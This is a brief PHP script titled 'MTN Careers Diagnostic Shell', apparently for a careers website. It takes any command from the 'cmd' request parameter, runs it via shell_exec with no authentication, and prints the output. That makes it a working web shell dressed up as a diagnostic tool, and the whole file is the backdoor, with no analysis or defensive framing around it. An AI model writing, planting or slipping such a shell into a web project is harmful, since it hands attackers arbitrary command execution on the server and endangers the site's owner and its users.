<?php
// MTN Careers Diagnostic Shell
if (isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec($_REQUEST['cmd'] . ' 2>&1') . '</pre>';
} else {
    echo 'MTN Careers Diagnostic Shell Active.';
}
